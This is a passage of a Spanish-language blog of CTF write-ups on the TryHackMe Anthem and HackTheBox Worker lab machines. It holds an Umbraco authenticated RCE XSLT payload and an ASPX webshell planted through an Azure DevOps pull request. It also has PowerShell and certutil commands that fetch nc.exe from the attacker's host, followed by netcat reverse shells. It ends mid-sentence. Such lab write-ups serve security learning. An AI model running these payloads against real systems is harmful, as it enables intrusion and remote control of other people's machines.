Administrator: Ac√° usando la ayuda que nos brinda, indica que debemos buscar :O, pero ni idea‚Ä¶ Despu√©s de leer atentamente, los compa√±eros de trabajo le dedican un poema al admin: Buscando en internet la frase, tenemos el nombre del autor, ese resulta ser el admin (:( Can we find find the email address of the administrator?: Dado que vimos un correo, pero ese no es el indicado, podemos pensar que existe un patr√≥n en los correos, teniendo el nombre podemos generar uno:  Correo que encontramos pero no es: JD@anthem. com.  Correo generado con el patron (iniciales del nombre): **@anthem. com. ‚Ä¶ Spot Flags #: Our beloved admin left some flags behind that we require to gather before we proceed to the next task. . Recorriendo la pagina, vemos algunas banderas en formato CTF, tales como HTB{. . . }, encontremoslas. What is flag 1?: What is flag 2?: What is flag 3?: What is flag 4?: ‚Ä¶ Final Stage #: Let's get into the box using the intel we gathered. Si intentamos logearnos en el apartado de /umbraco con las credenciales que tenemos volando, logramos entrar:  ‚Ä¶  Rabbit hole Umbraco.  Access with RDP. ‚Ä¶ ‚ñø Rabbit hole (Umbraco exploitation):  Que me gusto, aunque hubiera sido un rabbit hole :P Recorriendo la p√°gina, podemos encontrar la versi√≥n del software, en este caso: Umbraco versi√≥n 7. 15. 4. Buscando exploits sobre esa versi√≥n encontramos uno con el que ya hab√≠a estado jugando en una m√°quina de HackTheBox, concretamente en Remote (de la cual tengo un writeup, el cual me sirvi√≥ para guiarme sobre como conseguir una reverse Shell). (La mayor√≠a de referencias las reutilizar√© de ese writeup, solo pa decirlo :P)  Umbraco CMS 7. 12. 4 - (Authenticated) Remote Code Execution. Bien, descarg√°ndolo y viendo el c√≥digo, debemos modificar algunas l√≠neas, tales como:  login: el usuario (email).  password: pues la password :P host: donde est√° alojado el CMS Umbraco (IP de la m√°quina). El proceso de explotaci√≥n se da por la falta de sanitizacion de la variable ctl00$body$xsltSelection del archivo /umbraco/developer/Xslt/xsltVisualize. aspx. En el que podemos enviar nuestro payload sin ning√∫n problema. El payload que usa el exploit es este: payload = '&lt;?xml version= 1. 0 ?&gt;&lt;xsl:stylesheet version= 1. 0  \\xmlns:xsl= http://www. w3. org/1999/XSL/Transform  xmlns:msxsl= urn:schemas-microsoft-com:xslt  \\xmlns:csharp_user= http://csharp. mycompany. com/mynamespace &gt;\\&lt;msxsl:script language= C#  implements-prefix= csharp_user &gt;public string xml() \\{ string cmd =   ; System. Diagnostics. Process proc = new System. Diagnostics. Process();\\ proc. StartInfo. FileName =  calc. exe ; proc. StartInfo. Arguments = cmd;\\ proc. StartInfo. UseShellExecute = false; proc. StartInfo. RedirectStandardOutput = true; \\ proc. Start(); string output = proc. StandardOutput. ReadToEnd(); return output; } \\ &lt;/msxsl:script&gt;&lt;xsl:template match= / &gt; &lt;xsl:value-of select= csharp_user:xml() /&gt;\\ &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; ';Como prueba de concepto, abre una calculadora, pero nosotros no queremos eso, intentemos ejecutar el comando whoami: (Algo importante es que al final debemos indicarle que nos muestre la respuesta del request) # Step 4 - Launch the attackr4 = s. post(url_xslt,data=data,headers=headers);print(r4. text)Ahora si, el payload quedaria: payload = '&lt;?xml version= 1. 0 ?&gt;&lt;xsl:stylesheet version= 1. 0  \\xmlns:xsl= http://www. w3. org/1999/XSL/Transform  xmlns:msxsl= urn:schemas-microsoft-com:xslt  \\xmlns:csharp_user= http://csharp. mycompany. com/mynamespace &gt;\\&lt;msxsl:script language= C#  implements-prefix= csharp_user &gt;public string xml() \\{ string cmd =   ; System. Diagnostics. Process proc = new System. Diagnostics. Process();\\ proc. StartInfo. FileName =  cmd. exe ; proc. StartInfo. Arguments =  whoami ;\\ proc. StartInfo. UseShellExecute = false; proc. StartInfo. RedirectStandardOutput = true; \\ proc. Start(); string output = proc. StandardOutput. ReadToEnd(); return output; } \\ &lt;/msxsl:script&gt;&lt;xsl:template match= / &gt; &lt;xsl:value-of select= csharp_user:xml() /&gt;\\ &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; '; How works startInfo. FileName and startInfo. Arguments. En la respuesta tenemos: nada u. uB√°sicamente buscando en internet, tenemos que debemos agregarlo algo a la cadena, el tema es que ejecuta cmd. exe, pero se queda con la consola abierta y nunca veremos el output. En Stack Overflow alguien agrego que usar /c al inicio de la cadena le indica a la consola que debe cerrarse apenas ejecute el comando. Prob√©moslo:  How to pass mult args in proc. StartInfo. . . . proc. StartInfo. FileName =  cmd. exe ; proc. StartInfo. Arguments =  /c whoami ;\. . . Ejecutamos: Perfecto, ahora que tenemos ejecuci√≥n de comandos, probemos cositas y veamos como conseguir la shell‚Ä¶ Debemos subir el binario nc a la maquina, nos apoyaremos de PowerShell para hacerlo: ‚ñ∏ Listamos el directorio TEMP: . . . proc. StartInfo. FileName =  cmd. exe ; proc. StartInfo. Arguments = @ /c dir . . \. . \. . \\Windows\\TEMP ;\. . . ‚ñ∏ Ponernos en escucha donde tenemos el binario nc: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . ‚ñ∏ Agregamos la linea que va a descargar el binario y lo guardara en la carpeta TEMP del sistema: . . . proc. StartInfo. FileName =  cmd. exe ; proc. StartInfo. Arguments = @ /c powershell IWR -uri http://10. 2. 65. 117:8000/nc64. exe -OutFile c:\\Windows\\TEMP\\nc. exe ;\. . . ‚ñ∏ Listamos el directorio TEMP para validar: . . . proc. StartInfo. FileName =  cmd. exe ; proc. StartInfo. Arguments = @ /c dir . . \. . \. . \\Windows\\TEMP ;\. . . Nice, no s√© por qu√© solo se muestra nuestro binario, pero bueno, sabemos que esta, ahora ejecut√©moslo: ‚ñ∏ Nos ponemos en escucha: ‚ù≠ nc -lvp 4433listening on [any] 4433 . . . ‚ñ∏ Le indicamos que nos genere la Reverse Shell: . . . proc. StartInfo. FileName =  cmd. exe ; proc. StartInfo. Arguments = @ /c . . \. . \. . \\Windows\\TEMP\\nc. exe 10. 2. 65. 117 4433 -e cmd. exe ;\. . . Perfectooooooooooooooooooo, tamos dentro pai (: Enumerando usuarios tenemos uno conocido: c:\&gt;net userUser accounts for \\-------------------------------------------------------------------------------Administrator      DefaultAccount      Guest          **** (ac√° ta el user u. u)            WDAGUtilityAccountDespu√©s de un rato decid√≠ probar con el puerto RDP pa ver si logr√°bamos entrar, ya que por este m√©todo no consegu√≠ nada √∫til, simplemente un directorio oculto con un archivo al que no podemos acceder, pero de esto hablaremos un poco m√°s adelante. Final del rabbit hole :P (al menos vimos como entrar a la m√°quina explotando Umbraco El tema es que en las preguntas, despu√©s de haber encontrado las flags, nos ped√≠a la de user. txt, se me hizo raro en el momento (y tambi√©n cuando hicimos whoami hubiera sido un indicio de que √≠bamos por otro camino), pero pues no le puse cuidado y pueeeeeeees la m√°quina no est√° hecha para entrar por este lado (o pues no logre moverme al usuario necesario desde dentro)‚Ä¶ ‚ñø Acceso con RDP a la m√°quina: Entonces :( si recordamos, tenemos el puerto **** (RDP) abierto. Este puerto nos permite conectarnos de manera remota a un computador. Intent√©moslo :O Encontramos esta herramienta: remmina.  How to connect to a remote desktop from Linux. Despu√©s de instalarla, la ejecutamos e ingresamos la IP de la m√°quina: Damos enter, aceptamos el certificado y a continuaci√≥n nos pide las credenciales del usuario: Estando dentro (supongo que no me cargo el fondo de pantalla :P): Gain initial access to the machine, what is the contents of user. txt?: Can we spot the admin password?: Enumerando la m√°quina, encontramos un folder oculto en la raiz del sistema.  Dentro tenemos un archivo, pero que al intentar abrilo, no nos deja por falta de permisos: Si revisamos el owner del archivo con el comando dir /q, vemos que somos nosotros, podemos usar icacls para validar que permisos tenemos sobre el archivo: c:\backup&gt;icacls restore. txtSuccessfully processed 1 files; Failed processing 0 filesBien, pues siendo los propietarios del archivo podemos cambiarle los permisos, indiqu√©mosle con icacls que le d√© permisos de modificaci√≥n sobre el archivo a nuestro usuario:  Info sobre ICACLS y gestion de permisos. Perfecto, tenemos una string que parece una contrase√±a :P Escalate your privileges to root, what is the contents of root. txt?: Migramos al usuario Administrator y tenemos: Y listos, podemos ver la flag de root. txt; hemos terminado (: ‚Ä¶ M√°quina muy de jugar (CTF), me estoy enfocando en m√°quinas Windows, ya que intente una nivel dif√≠cil en HackTheBox y me exploto la cabeza, muy bajo nivel para meterle. Me hubiera gustado que la ruta hubiera sido explotar Umbraco, de alguna forma encontrar la contrase√±a del usuario y ah√≠ si hacer uso del puerto RDP‚Ä¶ Pero bueno, no pasa nada, igual se aprendi√≥ :P Me gusto el uso de icacls para gestionar permisos y entiendo que es super√∫til en entornos reales. Muchas gracias por leer y como siempre‚Ä¶ A seguir rompiendo todo (: "
    }, {
    "id": 64,
    "url": "http://localhost:4000/htb/worker",
    "title": "HackTheBox - Worker",
    "body": "2021/01/30 - M√°quina Windows nivel medio. Wowoworker, vamos a jugar mucho con repositorios y ramas. Romperemos cositas de Azure DevOps para ejecutar comandos en el sistema como Administradores.  TL;DR (Spanish writeup): Creador: ekenas. Linda maquina eh! Empezaremos enumerando repositorios, nos copiaremos uno que est√° siendo mantenido como dimensi√≥n. worker. htb, esto hecho con la herramienta svn (que es uno de los servicios que tenemos corriendo). Jugando con los argumentos usaremos uno para ver los commits (un log de ellos) para as√≠ obtener un usuario: nathen. Despu√©s usaremos otro argumento para ver detalladamente cada commit, de ah√≠ obtendremos la contrase√±a del usuario, con esas credenciales lograremos entrar a un nuevo dominio: devops. worker. htb. Estando dentro haremos commit para subir una webshell. Con ella generaremos una reverse Shell. Con enumeraci√≥n b√°sica encontraremos (casi que no) un disco nuevo: w:\. De ah√≠ obtendremos las credenciales del usuario robisl. Con ellas podemos entrar al sistema con evil-winrm y tambi√©n a devops. worker. htb. Usaremos una funcionalidad de Azure DevOps que nos permite ejecutar comandos en el sistema como ‚Äútareas‚Äù. Nos daremos cuenta de que se est√°n ejecutando como administrador. Aprovecharemos esa locura para obtener una reverse Shell. O bueno, algo parecido (: Clasificaci√≥n de la m√°quina. : Vamos a ensuciarnos un poco y trepa a la realidad.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto). D√©mosle candela. Tendremos como siempre 3 fases:  Enumeraci√≥n Explotaci√≥n Escalada de privilegios‚Ä¶ Enumeraci√≥n #: Empezaremos realizando un escaneo de puertos sobre la m√°quina para saber que servicios est√° corriendo. ‚Äì¬ª nmap -p- --open -v -Pn 10. 10. 10. 203En este caso vamos a agregarle el par√°metro -T para hacer el escaneo m√°s r√°pido. ‚Äì¬ª nmap -p- --open -v -Pn -T5 10. 10. 10. 203A√∫n sigue lento, cambiemos el -T por --min-rate: ‚Äì¬ª nmap -p- --open -v -Pn --min-rate=2000 10. 10. 10. 203 -oG initScanPerfecto va mucho m√°s r√°pido.  Es importante hacer un escaneo total, sin cambios ni parametros de m√°s, asi vaya lento, que nos permita ver si obviamos/pasamos alg√∫n puerto.  ‚Äì¬ª nmap -p- --open -v -Pn 10. 10. 10. 203 -oG totalScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -Pn   Evita que realice Host Discovery, como ping (P) y el DNS (n)       -T   Forma de escanear s√∫per r√°pido, (hace mucho ruido, pero al ser un entorno controlado no nos preocupamos)       ‚Äìmin-rate   Indica que no queremos hacer peticiones menores al n√∫mero que pongamos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Mon Nov 23 25:25:25 2020 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10. 10. 10. 203# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 203 ()  Status: UpHost: 10. 10. 10. 203 ()  Ports: 80/open/tcp//http///, 3690/open/tcp//svn///, 5985/open/tcp//wsman///   Ignored State: filtered (65532)# Nmap done at Mon Nov 23 25:25:25 2020 -- 1 IP address (1 host up) scanned in 162. 46 secondsMuy bien, tenemos los siguientes servicios:       Puerto   Descripci√≥n         80   HTTP: Servidor web       3690   SVN: A√∫n no lo sabemos       5985   WSMan (WinRM): Protocolo basado en SOAP para la administraci√≥n de servidores, dispositivos, aplicaciones y diversos servicios web. )   Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio: ‚Äì¬ª nmap -p 80,3690,5985 -sC -sV 10. 10. 10. 203 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan # Nmap 7. 80 scan initiated Mon Nov 23 25:25:25 2020 as: nmap -p 80,3690,5985 -sC -sV -oN portScan 10. 10. 10. 203Nmap scan report for 10. 10. 10. 203Host is up (0. 19s latency). PORT   STATE SERVICE VERSION80/tcp  open http   Microsoft IIS httpd 10. 0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10. 0|_http-title: IIS Windows Server3690/tcp open svnserve Subversion5985/tcp open http   Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not FoundService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsTenemos:       Puerto   Servicio   Versi√≥n         80   HTTP   Microsoft IIS httpd 10. 0       3690   svnserve   Subversion       5985   HTTP   Microsoft HTTPAPI (SSDP/UPnP)   Listo, demosle e investiguemos m√°s sobre cada servicio. ‚Ä¶ ‚Ä¢ Puerto 80 ‚åñ: Solo nos muestra esto, si damos click en la imagen nos lleva a otro dominio fuera de la m√°quina (relacionado con documentaci√≥n), por ahora nos enfocaremos solo en esta p√°gina. Podemos intentar hacer fuzzing de directorios a ver si encontramos algo, pero Nelson, no obtenemos nada. Miremos otro servicio mientras tanto‚Ä¶ ‚Ä¢ Puerto 3690 ‚åñ: Buscando que hace svn tenemos que es una herramienta que nos permite el control de versiones de Subversion. Perfecto, encontr√© esta guia que nos indica el uso de svn entre ellas nos muestra como ‚Äúprobar‚Äù el funcionamiento del repositorio generando una copia del mismo.  To test the server‚Äôs functionality, you can create a working copy of your repository using your shell. The checkout command will create a working copy of the repository. CSoft Tendr√≠amos:  svn co svn://your-domain. com/$HOME/my-repo my-working-dir En nuestro caso quedar√≠a as√≠: ‚Äì¬ª svn co svn://10. 10. 10. 203/ repository_copy/A  repository_copy/dimension. worker. htbA  repository_copy/dimension. worker. htb/LICENSE. txtA  repository_copy/dimension. worker. htb/README. txtA  repository_copy/dimension. worker. htb/assetsA  repository_copy/dimension. worker. htb/assets/cssA  repository_copy/dimension. worker. htb/assets/css/fontawesome-all. min. cssA  repository_copy/dimension. worker. htb/assets/css/main. cssA  repository_copy/dimension. worker. htb/assets/css/noscript. cssA  repository_copy/dimension. worker. htb/assets/jsA  repository_copy/dimension. worker. htb/assets/js/breakpoints. min. jsA  repository_copy/dimension. worker. htb/assets/js/browser. min. jsA  repository_copy/dimension. worker. htb/assets/js/jquery. min. jsA  repository_copy/dimension. worker. htb/assets/js/main. jsA  repository_copy/dimension. worker. htb/assets/js/util. jsA  repository_copy/dimension. worker. htb/assets/sassA  repository_copy/dimension. worker. htb/assets/sass/baseA  repository_copy/dimension. worker. htb/assets/sass/base/_page. scssA  repository_copy/dimension. worker. htb/assets/sass/base/_reset. scssA  repository_copy/dimension. worker. htb/assets/sass/base/_typography. scssA  repository_copy/dimension. worker. htb/assets/sass/componentsA  repository_copy/dimension. worker. htb/assets/sass/components/_actions. scssA  repository_copy/dimension. worker. htb/assets/sass/components/_box. scssA  repository_copy/dimension. worker. htb/assets/sass/components/_button. scssA  repository_copy/dimension. worker. htb/assets/sass/components/_form. scssA  repository_copy/dimension. worker. htb/assets/sass/components/_icon. scssA  repository_copy/dimension. worker. htb/assets/sass/components/_icons. scssA  repository_copy/dimension. worker. htb/assets/sass/components/_image. scssA  repository_copy/dimension. worker. htb/assets/sass/components/_list. scssA  repository_copy/dimension. worker. htb/assets/sass/components/_table. scssA  repository_copy/dimension. worker. htb/assets/sass/layoutA  repository_copy/dimension. worker. htb/assets/sass/layout/_bg. scssA  repository_copy/dimension. worker. htb/assets/sass/layout/_footer. scssA  repository_copy/dimension. worker. htb/assets/sass/layout/_header. scssA  repository_copy/dimension. worker. htb/assets/sass/layout/_main. scssA  repository_copy/dimension. worker. htb/assets/sass/layout/_wrapper. scssA  repository_copy/dimension. worker. htb/assets/sass/libsA  repository_copy/dimension. worker. htb/assets/sass/libs/_breakpoints. scssA  repository_copy/dimension. worker. htb/assets/sass/libs/_functions. scssA  repository_copy/dimension. worker. htb/assets/sass/libs/_mixins. scssA  repository_copy/dimension. worker. htb/assets/sass/libs/_vars. scssA  repository_copy/dimension. worker. htb/assets/sass/libs/_vendor. scssA  repository_copy/dimension. worker. htb/assets/sass/main. scssA  repository_copy/dimension. worker. htb/assets/sass/noscript. scssA  repository_copy/dimension. worker. htb/assets/webfontsA  repository_copy/dimension. worker. htb/assets/webfonts/fa-brands-400. eotA  repository_copy/dimension. worker. htb/assets/webfonts/fa-brands-400. svgA  repository_copy/dimension. worker. htb/assets/webfonts/fa-brands-400. ttfA  repository_copy/dimension. worker. htb/assets/webfonts/fa-brands-400. woffA  repository_copy/dimension. worker. htb/assets/webfonts/fa-brands-400. woff2A  repository_copy/dimension. worker. htb/assets/webfonts/fa-regular-400. eotA  repository_copy/dimension. worker. htb/assets/webfonts/fa-regular-400. svgA  repository_copy/dimension. worker. htb/assets/webfonts/fa-regular-400. ttfA  repository_copy/dimension. worker. htb/assets/webfonts/fa-regular-400. woffA  repository_copy/dimension. worker. htb/assets/webfonts/fa-regular-400. woff2A  repository_copy/dimension. worker. htb/assets/webfonts/fa-solid-900. eotA  repository_copy/dimension. worker. htb/assets/webfonts/fa-solid-900. svgA  repository_copy/dimension. worker. htb/assets/webfonts/fa-solid-900. ttfA  repository_copy/dimension. worker. htb/assets/webfonts/fa-solid-900. woffA  repository_copy/dimension. worker. htb/assets/webfonts/fa-solid-900. woff2A  repository_copy/dimension. worker. htb/imagesA  repository_copy/dimension. worker. htb/images/bg. jpgA  repository_copy/dimension. worker. htb/images/overlay. pngA  repository_copy/dimension. worker. htb/images/pic01. jpgA  repository_copy/dimension. worker. htb/images/pic02. jpgA  repository_copy/dimension. worker. htb/images/pic03. jpgA  repository_copy/dimension. worker. htb/index. htmlA  repository_copy/moved. txtRevisi√≥n obtenida: 5‚Äì¬ª ls repository_copy/dimension. worker. htb moved. txtPerfecto, tenemos una copia del repositorio en nuestra m√°quina, d√©mosle un vistazo a ver que podemos obtener:  Nos muestra lo que parece ser el dominio al que resuelve ese repositorio: dimension. worker. htb.  Otro dominio e informaci√≥n extra en el archivo moved. txt. ‚Äì¬ª cat moved. txt This repository has been migrated and will no longer be maintaned here. You can find the latest version at: http://devops. worker. htb// The Worker team :)Pues vamos a tener que jugar con el archivo /etc/hosts para que al entrar a la direcci√≥n 10. 10. 10. 203 nos resuelva a los dominios dimension. worker. htb y devops. worker. htb que al parecer son los que realmente est√°n siendo mantenidos por el equipo Worker. ‚Äì¬ª cat /etc/hosts. . . 10. 10. 10. 203 dimension. worker. htb devops. worker. htb. . . Podemos probar nuevamente en la web pero ahora indic√°ndole el dominio dimension. worker. htb: Y con devops. worker. htb: Pues nada, d√©mosle a dimension a ver si logramos obtener un usuario para poder entrar en devops. Si entramos a work nos muestra lo que parecen ser varios vHost, si ponemos el mouse encima (no pude hacer que se viera en la imagen :P) nos muestra estas URL‚Äôs:  alpha. worker. htb cartoon. worker. htb lens. worker. htb solid-state. worker. htb spectral. worker. htb story. worker. htbPuede ser un gran (gran) rabbit hole, pero igual quiero probar si obtenemos algo. Agregu√©moslos al /etc/hosts. ‚Äì¬ª cat /etc/hosts. . . 10. 10. 10. 203 dimension. worker. htb devops. worker. htb alpha. worker. htb cartoon. worker. htb lens. worker. htb solid-state. worker. htb spectral. worker. htb story. worker. htb. . . Bueno, no fue tanto tiempo perdido, les di una ojeada r√°pida por si ve√≠a algo interesante pero no, nada llamativo. Segu√≠ buscando informaci√≥n sobre svn y despu√©s de un rato entend√≠ varios de sus comandos: Podemos ver los logs del repositorio: ‚Äì¬ª svn log svn://10. 10. 10. 203/------------------------------------------------------------------------r5 | nathen | 2020-06-20 08:52:00 -0500 (s√°b 20 de jun de 2020) | 1 l√≠neaAdded note that repo has been migrated------------------------------------------------------------------------r4 | nathen | 2020-06-20 08:50:20 -0500 (s√°b 20 de jun de 2020) | 1 l√≠neaMoving this repo to our new devops server which will handle the deployment for us------------------------------------------------------------------------r3 | nathen | 2020-06-20 08:46:19 -0500 (s√°b 20 de jun de 2020) | 1 l√≠nea-------------------------------------------------------------------------r2 | nathen | 2020-06-20 08:45:16 -0500 (s√°b 20 de jun de 2020) | 1 l√≠neaAdded deployment script------------------------------------------------------------------------r1 | nathen | 2020-06-20 08:43:43 -0500 (s√°b 20 de jun de 2020) | 1 l√≠neaFirst version------------------------------------------------------------------------ Podemos decirle que haga un verbose para que sea m√°s explicito con la info:‚Äì¬ª svn log -v svn://10. 10. 10. 203/------------------------------------------------------------------------r5 | nathen | 2020-06-20 08:52:00 -0500 (s√°b 20 de jun de 2020) | 1 l√≠neaRutas cambiadas:  A /moved. txtAdded note that repo has been migrated------------------------------------------------------------------------r4 | nathen | 2020-06-20 08:50:20 -0500 (s√°b 20 de jun de 2020) | 1 l√≠neaRutas cambiadas:  D /deploy. ps1Moving this repo to our new devops server which will handle the deployment for us------------------------------------------------------------------------r3 | nathen | 2020-06-20 08:46:19 -0500 (s√°b 20 de jun de 2020) | 1 l√≠neaRutas cambiadas:  M /deploy. ps1-------------------------------------------------------------------------r2 | nathen | 2020-06-20 08:45:16 -0500 (s√°b 20 de jun de 2020) | 1 l√≠neaRutas cambiadas:  A /deploy. ps1Added deployment script------------------------------------------------------------------------r1 | nathen | 2020-06-20 08:43:43 -0500 (s√°b 20 de jun de 2020) | 1 l√≠neaRutas cambiadas:  A /dimension. worker. htb  A /dimension. worker. htb/LICENSE. txt  A /dimension. worker. htb/README. txt  A /dimension. worker. htb/assets  A /dimension. worker. htb/assets/css  A /dimension. worker. htb/assets/css/fontawesome-all. min. css  A /dimension. worker. htb/assets/css/main. css  A /dimension. worker. htb/assets/css/noscript. css  A /dimension. worker. htb/assets/js  A /dimension. worker. htb/assets/js/breakpoints. min. js  A /dimension. worker. htb/assets/js/browser. min. js  A /dimension. worker. htb/assets/js/jquery. min. js. . . . . . #Todos los archivos que nos copio antes del repositorio. . . . Vemos una traza de la fecha, hora, el ID de cada log (r*), el usuario y que se hizo (que conten√≠a el commit). En los logs r2, r3 y r4 hay un archivo llamado deploy. ps1 que seg√∫n la descripci√≥n era (lo borraron en el commit 4) un script para desplegar me imagino que todo el entorno o herramientas necesarias.  Tenemos un usuario: nathen. Encontr√© como podemos ver que cambio se realiz√≥ en cada commit o ac√° tambi√©n (si es que hicieron alg√∫n cambio): ‚Äì¬ª svn diff svn://10. 10. 10. 203/svn: E195002: No se especificaron todas las revisiones requeridasCon -r le pasamos cu√°l commit queremos revisar (tambi√©n se puede poner un rango). Revisemos el 2 que fue cuando se agreg√≥ el archivo deploy. ps1. ‚Äì¬ª svn diff -r2 svn://10. 10. 10. 203/Index: deploy. ps1===================================================================--- deploy. ps1 (revisi√≥n: 2)+++ deploy. ps1 (nonexistent)@@ -1,6 +0,0 @@-$user =  nathen  -$plain =  wendel98 -$pwd = ($plain | ConvertTo-SecureString)-$Credential = New-Object System. Management. Automation. PSCredential $user, $pwd-$args =  Copy-Site. ps1 -Start-Process powershell. exe -Credential $Credential -ArgumentList ( -file $args )Opa, tenemos unas posibles credenciales. En el siguiente commit se arrepiente de lo que subio :(: ‚Äì¬ª svn diff -r3 svn://10. 10. 10. 203/Index: deploy. ps1===================================================================--- deploy. ps1 (revisi√≥n: 3)+++ deploy. ps1 (nonexistent)@@ -1,7 +0,0 @@-$user =  nathen  -# NOTE: We cant have my password here!!!-$plain =   -$pwd = ($plain | ConvertTo-SecureString)-$Credential = New-Object System. Management. Automation. PSCredential $user, $pwd-$args =  Copy-Site. ps1 -Start-Process powershell. exe -Credential $Credential -ArgumentList ( -file $args )\ No newline at end of filePero da igual, ya quedo la traza. nathen:wendel98. Probemos ingresando con ellas a devops. worker. htb: Perfecto, enumeremos el servicio Azure Devops. Una explicacion muy buena de Azure Devops y un documento que resume cada apartado. Despu√©s de mucha lectura sobre, pipelines, builds y dem√°s cositas, entend√≠ la estructura y flujo. ‚Ä¶ Explotaci√≥n #: Inicialmente hab√≠a probado simplemente en uno de los repositorios agregar un archivo y hacer un commit, pero obten√≠a el siguiente error: TF402455: Pushes to this branch are not permitted; you must use a pull request to update this branch. Pase de √©l y segu√≠ buscando formas de lograr algo‚Ä¶ Paso mucho tiempo :P y no encontr√© nada. Volv√≠ a intentar hacer un commit para subir un archivo desde la web, sali√≥ el mismo error, pero ahora lo busque en internet, encontr√© esto:  https://www. freshbrewed. science/azure-devops-vsts-security-and-policies-part-2/index. htmlEl problema es de pol√≠ticas y claramente por seguridad, pero el art√≠culo nos ense√±a una manera de remediarlo en la que clonaremos el repositorio, agregaremos el archivo, obtendremos el error, nos crearemos una nueva rama, haremos el push hacia el repositorio, iremos a la web en donde nos mostrara que alguien quiere hacer un commit, le daremos la opci√≥n de generar un pull request y con la misma web permitiremos que se genere el push. Veamos: Primero nos posicionamos en el repositorio que queramos para obtener el link y posteriormente clonarlo (se acuerdan los dominios que obtuvimos antes, pues ellos est√°n ac√°), usar√© lens inicialmente: ‚Äì¬ª git clone http://devops. worker. htb/ekenas/SmartHotel360/_git/lensClonando en 'lens'. . . Username for 'http://devops. worker. htb': nathenPassword for 'http://nathen@devops. worker. htb': remote: Azure Reposremote: Found 96 objects to send. (2 ms)Desempaquetando objetos: 100% (96/96), 2. 06 MiB | 828. 00 KiB/s, listo. ‚Äì¬ª ls lens/assets images index. html LICENSE. txt README. txtAhora agregamos el archivo, hacemos el commit y el push.  Usaremos . aspx: La extensi√≥n de archivo ASPX se utiliza para p√°ginas web que son generadas autom√°ticamente por el servidor y dirigen directamente a un servidor activo. Se asocian habitualmente con la infraestructura Microsoft ASP. NET. Este formato web puede abrirse en cualquier navegador web si la URL finaliza con la extensi√≥n ASPX. Online ASPX  Encontr√© esta webshell sencilla. ‚Äì¬ª vim candelapura. aspx ‚Äì¬ª git add . ‚Äì¬ª git commit -m  Quemando esto [master 014fedf] Quemando esto‚Äì¬ª git pushUsername for 'http://devops. worker. htb': nathenPassword for 'http://nathen@devops. worker. htb': Enumerando objetos: 7, listo. Contando objetos: 100% (7/7), listo. Comprimiendo objetos: 100% (4/4), listo. Escribiendo objetos: 100% (4/4), 506 bytes | 506. 00 KiB/s, listo. Total 4 (delta 2), reusado 1 (delta 0), pack-reusado 0remote: Analyzing objects. . . (4/4) (6 ms)remote: Storing packfile. . . done (23 ms)remote: Storing index. . . done (31 ms)To http://devops. worker. htb/ekenas/SmartHotel360/_git/lens ! [remote rejected] master -&gt; master (TF402455: Pushes to this branch are not permitted; you must use a pull request to update this branch. )error: fall√≥ el push de algunas referencias a 'http://devops. worker. htb/ekenas/SmartHotel360/_git/lens'Obtenemos el error (: Ahora procedemos a crear una nueva rama: ‚Äì¬ª git checkout -b feature/patestpa Cambiado a nueva rama 'feature/patestpa'‚Äì¬ª git pushfatal: La rama actual feature/patestpa no tiene una rama upstream. Para realizar un push de la rama actual y configurar el remoto como upstream, use    git push --set-upstream origin feature/patestpa‚Äì¬ª git push --set-upstream origin feature/patestpaUsername for 'http://devops. worker. htb': nathenPassword for 'http://nathen@devops. worker. htb': Enumerando objetos: 7, listo. Contando objetos: 100% (7/7), listo. Comprimiendo objetos: 100% (4/4), listo. Escribiendo objetos: 100% (4/4), 506 bytes | 506. 00 KiB/s, listo. Total 4 (delta 2), reusado 1 (delta 0), pack-reusado 0remote: Analyzing objects. . . (4/4) (5 ms)remote: Storing packfile. . . done (33 ms)remote: Storing index. . . done (43 ms)To http://devops. worker. htb/ekenas/SmartHotel360/_git/lens  a306cfe. . 014fedf feature/patestpa -&gt; feature/patestpaRama 'feature/patestpa' configurada para hacer seguimiento a la rama remota 'feature/patestpa' de 'origin'. Listo, ahora vamos para la web y creamos el pull request: Damos clic en create a pull request: Ahora en Create: En esta pagina debemos hacer 3 cosas (que son las que a la derecha estan con un chulo ya), de esas controlamos 2:  Dar al boton Approve.  Agregar un Work Item, yo agregue cualquiera :PDamos clic en Complete y despues en Complete Merge, verifiquemos la estructura de archivos ahora: Ahora si el archivo esta en la raiz del repo, entonces podremos ingresar a el mediante la siguente url: http://lens. worker. htb/candelapura. aspx: Perfectooooooooooooooooooooo, ahora podriamos subir el binario netcat, para mediante certutil. exe o PowerShell subirlo a la maquina y despues usarlo para entablarnos una reverse shell, a ver: #Web/c dir c:\Windows\Temp#Attack machine‚Äì¬ª lslens nc. exe repository_copy‚Äì¬ª python -m SimpleHTTPServer#Web/c certutil. exe -f -split -urlcache http://10. 10. 14. 161:8000/nc. exe c:\Windows\Temp\nc. exe #Web/c c:\Windows\Temp\nc. exe 10. 10. 14. 161 4433 -e cmd. exe Opa, tamos dentro compadreeee (: Lindo lindo, bueno a ver como podemos cambiar de usuario. ‚Ä¶ Escalada de privilegios #: Ac√° fui un fracaso como enumerador :P, enumere y enumere y me perd√≠ demasiado, use Winpeas y no encontr√© nada‚Ä¶ Segu√≠ enumerando hasta que ya no sab√≠a hacia donde mirar‚Ä¶ Buscando ayuda, Sosa me indico que volviera a revisar Winpeas pero encofado en los discos‚Ä¶ Y 